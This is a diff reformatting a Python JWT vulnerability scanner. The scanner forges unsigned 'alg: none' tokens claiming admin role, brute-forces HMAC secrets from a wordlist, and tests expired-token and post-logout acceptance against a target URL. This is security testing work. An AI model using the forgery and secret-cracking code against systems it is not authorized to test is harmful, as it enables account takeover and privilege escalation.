@@ -56,24 +56,28 @@ def test_alg_none(token, target_url=None):
     findings = []
 
     for alg in ["none", "None", "NONE", "nOnE"]:
-        header = base64.urlsafe_b64encode(
-            json.dumps({"alg": alg, "typ": "JWT"}).encode()
-        ).rstrip(b"=").decode()
+        header = base64.urlsafe_b64encode(json.dumps({"alg": alg, "typ": "JWT"}).encode()).rstrip(b"=").decode()
         payload_data["role"] = "admin"
-        payload_encoded = base64.urlsafe_b64encode(
-            json.dumps(payload_data).encode()
-        ).rstrip(b"=").decode()
+        payload_encoded = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=").decode()
         forged = f"{header}.{payload_encoded}."
 
         if target_url:
             try:
-                resp = requests.get(target_url, headers={"Authorization": f"Bearer {forged}"},
-                                    timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true")  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
+                resp = requests.get(
+                    target_url,
+                    headers={"Authorization": f"Bearer {forged}"},
+                    timeout=10,
+                    verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",
+                )  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
                 if resp.status_code == 200:
-                    findings.append({
-                        "type": "ALG_NONE", "alg_value": alg,
-                        "status": resp.status_code, "severity": "CRITICAL",
-                    })
+                    findings.append(
+                        {
+                            "type": "ALG_NONE",
+                            "alg_value": alg,
+                            "status": resp.status_code,
+                            "severity": "CRITICAL",
+                        }
+                    )
                     print(f"  [!] VULNERABLE: alg={alg} accepted (status {resp.status_code})")
                 else:
                     print(f"  [+] alg={alg} rejected (status {resp.status_code})")
@@ -107,10 +111,10 @@ def test_hmac_brute_force(token, wordlist_path):
                     continue
                 computed = hmac.new(secret.encode(), signing_input, hash_func).digest()
                 if hmac.compare_digest(computed, signature):
-                    print(f"  [!] SECRET FOUND: '{secret}' (attempt {i+1})")
+                    print(f"  [!] SECRET FOUND: '{secret}' (attempt {i + 1})")
                     return secret
                 if (i + 1) % 10000 == 0:
-                    print(f"  [*] Tried {i+1} secrets...")
+                    print(f"  [*] Tried {i + 1} secrets...")
     except FileNotFoundError:
         print(f"  [-] Wordlist not found: {wordlist_path}")
     print("  [-] Secret not found in wordlist")
@@ -134,8 +138,12 @@ def test_expired_token(token, target_url):
     payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
     if "exp" in payload and payload["exp"] < datetime.now(timezone.utc).timestamp():
         try:
-            resp = requests.get(target_url, headers={"Authorization": f"Bearer {token}"},
-                                timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true")  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
+            resp = requests.get(
+                target_url,
+                headers={"Authorization": f"Bearer {token}"},
+                timeout=10,
+                verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",
+            )  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
             if resp.status_code == 200:
                 print(f"  [!] VULNERABLE: Expired token accepted (status {resp.status_code})")
                 return [{"type": "EXPIRED_TOKEN_ACCEPTED", "severity": "HIGH"}]
@@ -153,12 +161,18 @@ def test_token_after_logout(token, target_url, logout_url):
     print("\n[*] Testing token validity after logout...")
     headers = {"Authorization": f"Bearer {token}"}
     try:
-        pre = requests.get(target_url, headers=headers, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true")  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
+        pre = requests.get(
+            target_url, headers=headers, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true"
+        )  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
         if pre.status_code != 200:
             print("  [-] Token not valid pre-logout, skipping")
             return []
-        requests.post(logout_url, headers=headers, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true")  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
-        post = requests.get(target_url, headers=headers, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true")  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
+        requests.post(
+            logout_url, headers=headers, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true"
+        )  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
+        post = requests.get(
+            target_url, headers=headers, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true"
+        )  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
         if post.status_code == 200:
             print("  [!] VULNERABLE: Token still valid after logout")
             return [{"type": "NO_TOKEN_REVOCATION", "severity": "HIGH"}]
@@ -173,13 +187,18 @@ def check_jwks_endpoint(base_url):
     """Check for JWKS and OpenID configuration endpoints."""
     print("\n[*] Checking for JWKS/OIDC endpoints...")
     endpoints = [
-        "/.well-known/jwks.json", "/.well-known/openid-configuration",
-        "/oauth/certs", "/auth/keys", "/.well-known/keys",
+        "/.well-known/jwks.json",
+        "/.well-known/openid-configuration",
+        "/oauth/certs",
+        "/auth/keys",
+        "/.well-known/keys",
     ]
     for ep in endpoints:
         url = urljoin(base_url, ep)
         try:
-            resp = requests.get(url, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true")  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
+            resp = requests.get(
+                url, timeout=10, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true"
+            )  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
             if resp.status_code == 200:
                 print(f"  [+] Found: {ep}")
                 data = resp.json()
